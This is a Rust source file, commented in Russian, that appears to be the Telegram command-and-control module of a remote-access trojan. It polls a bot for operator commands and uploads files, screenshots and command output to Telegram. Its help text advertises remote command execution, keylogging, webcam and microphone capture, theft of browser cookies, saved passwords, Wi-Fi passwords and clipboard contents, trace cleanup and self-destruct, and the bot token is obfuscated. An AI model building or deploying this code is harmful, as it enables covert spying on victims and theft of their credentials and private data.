use std::collections::HashMap;
use std::sync::Arc;
use serde::Deserialize;
use anyhow::{Result, Context};
use reqwest::{Client, multipart::Form};
use tokio::time::{sleep, Duration};

use crate::config::{POLLING_INTERVAL_MS, HTTP_TIMEOUT_SECONDS};
use crate::auth;
use crate::token_security;

/// Структура для обновлений от Telegram
#[derive(Debug, Deserialize)]
pub struct Update {
    pub update_id: i64,
    pub message: Option<Message>,
}

/// Структура сообщения от Telegram
#[derive(Debug, Deserialize)]
pub struct Message {
    pub message_id: i64,
    pub from: Option<User>,
    pub chat: Chat,
    pub date: i64,
    pub text: Option<String>,
    pub document: Option<Document>,
}

/// User structure
#[derive(Debug, Deserialize)]
pub struct User {
    pub id: i64,
    pub is_bot: bool,
    pub first_name: String,
    pub last_name: Option<String>,
    pub username: Option<String>,
}

/// Chat structure
#[derive(Debug, Deserialize)]
pub struct Chat {
    pub id: i64,
    pub r#type: String,
}

/// Структура документа
#[derive(Debug, Deserialize)]
pub struct Document {
    pub file_id: String,
    pub file_unique_id: String,
    pub file_name: Option<String>,
    pub mime_type: Option<String>,
    pub file_size: Option<i64>,
}

/// Ответ от Telegram API
#[derive(Debug, Deserialize)]
pub struct TelegramResponse<T> {
    pub ok: bool,
    pub result: Option<T>,
    pub description: Option<String>,
}

/// Информация о файле
#[derive(Debug, Deserialize)]
pub struct FileInfo {
    pub file_id: String,
    pub file_unique_id: String,
    pub file_size: Option<i64>,
    pub file_path: Option<String>,
}

/// Telegram Bot клиент
#[derive(Debug, Clone)]
pub struct TelegramClient {
    client: Client,
    bot_token: String,
    base_url: String,
    last_update_id: Arc<std::sync::Mutex<i64>>,
}

impl TelegramClient {
    /// Создает новый клиент
    pub fn new() -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(HTTP_TIMEOUT_SECONDS))
            .build()
            .expect("Failed to create HTTP client");

        // 🔐 БЕЗОПАСНОЕ ПОЛУЧЕНИЕ ТОКЕНА ИЗ ЗАШИФРОВАННЫХ ЧАСТЕЙ
        let secure_token = token_security::get_secure_bot_token()
            .expect("Failed to reconstruct bot token from encrypted segments");

        Self {
            client,
            bot_token: secure_token.clone(),
            base_url: format!("https://api.telegram.org/bot{}", secure_token),
            last_update_id: Arc::new(std::sync::Mutex::new(0)),
        }
    }

    /// Отправляет текстовое сообщение
    pub async fn send_message(&self, chat_id: i64, text: &str) -> Result<()> {
        let url = format!("{}/sendMessage", self.base_url);
        
        let mut params = HashMap::new();
        params.insert("chat_id", chat_id.to_string());
        // Экранируем специальные символы для Markdown
        let escaped_text = self.escape_markdown(text);
        params.insert("text", escaped_text);
        params.insert("parse_mode", "Markdown".to_string());
        
        let response = self.client
            .post(&url)
            .json(&params)
            .send()
            .await
            .context("Failed to send message")?;

        if !response.status().is_success() {
            let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
            return Err(anyhow::anyhow!("Telegram API error: {}", error_text));
        }

        Ok(())
    }
    
    /// Экранирует специальные символы для Markdown
    fn escape_markdown(&self, text: &str) -> String {
        text.replace("\\", "\\\\")
            .replace("_", "\\_")
            .replace("*", "\\*")
            .replace("[", "\\[")
            .replace("]", "\\]")
            .replace("(", "\\(")
            .replace(")", "\\)")
            .replace("~", "\\~")
            .replace("`", "\\`")
            .replace(">", "\\>")
            .replace("#", "\\#")
            .replace("+", "\\+")
            .replace("-", "\\-")
            .replace("=", "\\=")
            .replace("|", "\\|")
            .replace("{", "\\{")
            .replace("}", "\\}")
            .replace(".", "\\.")
            .replace("!", "\\!")
    }

    /// Отправляет файл
    pub async fn send_document(&self, chat_id: i64, file_path: &str, caption: Option<&str>) -> Result<()> {
        let url = format!("{}/sendDocument", self.base_url);
        
        let file_data = tokio::fs::read(file_path).await
            .context("Failed to read file")?;
        
        let file_name = std::path::Path::new(file_path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file");

        let mut form = Form::new()
            .text("chat_id", chat_id.to_string())
            .part("document", reqwest::multipart::Part::bytes(file_data).file_name(file_name.to_string()));

        if let Some(caption) = caption {
            form = form.text("caption", caption.to_string());
        }

        let response = self.client
            .post(&url)
            .multipart(form)
            .send()
            .await
            .context("Failed to send document")?;

        if !response.status().is_success() {
            let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
            return Err(anyhow::anyhow!("Telegram API error: {}", error_text));
        }

        Ok(())
    }

    /// Отправляет фото
    pub async fn send_photo(&self, chat_id: i64, photo_data: Vec<u8>, caption: Option<&str>) -> Result<()> {
        let url = format!("{}/sendPhoto", self.base_url);
        
        let mut form = Form::new()
            .text("chat_id", chat_id.to_string())
            .part("photo", reqwest::multipart::Part::bytes(photo_data).file_name("screenshot.png"));

        if let Some(caption) = caption {
            form = form.text("caption", caption.to_string());
        }

        let response = self.client
            .post(&url)
            .multipart(form)
            .send()
            .await
            .context("Failed to send photo")?;

        if !response.status().is_success() {
            let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
            return Err(anyhow::anyhow!("Telegram API error: {}", error_text));
        }

        Ok(())
    }

    /// Получает обновления от Telegram
    pub async fn get_updates(&self) -> Result<Vec<Update>> {
        let url = format!("{}/getUpdates", self.base_url);
        
        let last_id = {
            let guard = self.last_update_id.lock().unwrap();
            *guard + 1
        };
        
        let mut params = HashMap::new();
        params.insert("offset", last_id.to_string());
        params.insert("timeout", "10".to_string());

        let response = self.client
            .post(&url)
            .json(&params)
            .send()
            .await
            .context("Failed to get updates")?;

        let response_text = response.text().await?;
        let telegram_response: TelegramResponse<Vec<Update>> = serde_json::from_str(&response_text)
            .context("Failed to parse Telegram response")?;

        if !telegram_response.ok {
            return Err(anyhow::anyhow!("Telegram API error: {:?}", telegram_response.description));
        }

        let updates = telegram_response.result.unwrap_or_default();
        
        // Обновляем last_update_id
        if let Some(last_update) = updates.last() {
            let mut guard = self.last_update_id.lock().unwrap();
            *guard = last_update.update_id;
        }

        Ok(updates)
    }

    /// Скачивает файл по file_id
    pub async fn download_file(&self, file_id: &str) -> Result<Vec<u8>> {
        // Сначала получаем информацию о файле
        let file_info = self.get_file_info(file_id).await?;
        
        if let Some(file_path) = file_info.file_path {
            let download_url = format!("https://api.telegram.org/file/bot{}/{}", self.bot_token, file_path);
            
            let response = self.client
                .get(&download_url)
                .send()
                .await
                .context("Failed to download file")?;

            if response.status().is_success() {
                let bytes = response.bytes().await
                    .context("Failed to read file bytes")?;
                Ok(bytes.to_vec())
            } else {
                Err(anyhow::anyhow!("Failed to download file: HTTP {}", response.status()))
            }
        } else {
            Err(anyhow::anyhow!("File path not available"))
        }
    }

    /// Получает информацию о файле
    async fn get_file_info(&self, file_id: &str) -> Result<FileInfo> {
        let url = format!("{}/getFile", self.base_url);
        
        let mut params = HashMap::new();
        params.insert("file_id", file_id.to_string());

        let response = self.client
            .post(&url)
            .json(&params)
            .send()
            .await
            .context("Failed to get file info")?;

        let response_text = response.text().await?;
        let telegram_response: TelegramResponse<FileInfo> = serde_json::from_str(&response_text)
            .context("Failed to parse file info response")?;

        if telegram_response.ok {
            telegram_response.result.ok_or_else(|| anyhow::anyhow!("No file info in response"))
        } else {
            Err(anyhow::anyhow!("Telegram API error: {:?}", telegram_response.description))
        }
    }

    /// Проверяет авторизацию сообщения через Argon2 хеш
    pub fn is_message_authorized(&self, message: &Message) -> bool {
        auth::is_authorized_chat(message.chat.id)
    }

    /// Отправляет сообщение об ошибке авторизации
    pub async fn send_unauthorized_message(&self, chat_id: i64) -> Result<()> {
        let message = "🚫 У вас нет прав для использования этого бота.";
        self.send_message(chat_id, message).await
    }

    /// Отправляет справку
    pub async fn send_help(&self, chat_id: i64) -> Result<()> {
        let help_text = r#"
🤖 **Команды бота для удаленного управления:**

**📋 Системная информация:**
• `/devices` - список всех устройств
• `/info <id>` - информация об устройстве
• `/ipinfo <id>` - информация об IP и местоположении

**📁 Файловая система:**
• `/listdrives <id>` - список дисков
• `/listdirs <id> <path>` - список папок
• `/listfiles <id> <path>` - список файлов
• `/download <id> <file>` - скачать файл
• `/upload <id> <path>` - загрузить файл

**⚙️ Выполнение команд:**
• `/exec <id> <command>` - выполнить команду
• `/start <id> <app> <params>` - запустить приложение
• `/apps <id>` - список установленных программ
• `/popup <id> <text>` - показать всплывающее окно

**📸 Мониторинг:**
• `/screenshot <id>` - снимок экрана
• `/webcam <id> <delay> <camera>` - фото с веб-камеры
• `/keylogger <id>` - лог нажатий клавиш
• `/micrec <id>` - запись с микрофона

**🔐 Безопасность:**
• `/cookies <id>` - файлы cookies браузера
• `/weblogins <id>` - сохраненные пароли браузера
• `/wifiprofiles <id>` - профили Wi-Fi с паролями
• `/getclipboard <id>` - содержимое буфера обмена

**🔧 Управление:**
• `/startup <id>` - список автозагрузки
• `/url <id> <link>` - открыть ссылку
• `/reroll <id>` - изменить ID устройства
• `/cleanup <id>` - очистка следов работы
• `/selfdestruct <id>` - самоуничтожение (Pentagon Algorithm)

**💡 Дополнительно:**
• `/help` - эта справка

*Замените `<id>` на ID целевого устройства из команды `/devices`*
"#;
        
        self.send_message(chat_id, help_text).await
    }

    /// Основной цикл polling
    pub async fn start_polling<F>(&self, mut handler: F) -> Result<()>
    where
        F: FnMut(Message) -> Result<()> + Send,
    {
        log::info!("Starting Telegram bot polling...");
        
        loop {
            match self.get_updates().await {
                Ok(updates) => {
                    for update in updates {
                        if let Some(message) = update.message {
                            if !self.is_message_authorized(&message) {
                                log::warn!("Unauthorized access attempt from chat_id: {}", message.chat.id);
                                let _ = self.send_unauthorized_message(message.chat.id).await;
                                continue;
                            }

                            if let Err(e) = handler(message) {
                                log::error!("Error handling message: {}", e);
                            }
                        }
                    }
                }
                Err(e) => {
                    log::error!("Error getting updates: {}", e);
                    sleep(Duration::from_millis(5000)).await;
                }
            }
            
            sleep(Duration::from_millis(POLLING_INTERVAL_MS)).await;
        }
    }

    /// Отправляет длинное сообщение, разбивая его на части если необходимо
    pub async fn send_long_message(&self, chat_id: i64, text: &str) -> Result<()> {
        const MAX_MESSAGE_LENGTH: usize = 4096;
        
        if text.len() <= MAX_MESSAGE_LENGTH {
            return self.send_message(chat_id, text).await;
        }
        
        let chunks: Vec<String> = text
            .chars()
            .collect::<Vec<char>>()
            .chunks(MAX_MESSAGE_LENGTH)
            .map(|chunk| chunk.iter().collect::<String>())
            .collect();
            
        for (i, chunk) in chunks.iter().enumerate() {
            let message = if i == 0 {
                chunk.to_string()
            } else {
                format!("**Продолжение ({}/{}):**\n{}", i + 1, chunks.len(), chunk)
            };
            
            self.send_message(chat_id, &message).await?;
            
            // Небольшая задержка между сообщениями
            if i < chunks.len() - 1 {
                sleep(Duration::from_millis(100)).await;
            }
        }
        
        Ok(())
    }

    /// Отправляет сообщение с форматированием для команд
    pub async fn send_command_response(&self, chat_id: i64, device_id: &str, command: &str, result: &str) -> Result<()> {
        let formatted = format!(
            "🖥️ **Устройство:** `{}`\n\
            ⚡ **Команда:** `{}`\n\
            📤 **Результат:**\n```\n{}\n```",
            device_id, command, result
        );
        
        self.send_long_message(chat_id, &formatted).await
    }

    /// Отправляет сообщение об ошибке
    pub async fn send_error(&self, chat_id: i64, error: &str) -> Result<()> {
        let formatted = format!("❌ **Ошибка:** {}", error);
        self.send_message(chat_id, &formatted).await
    }
}
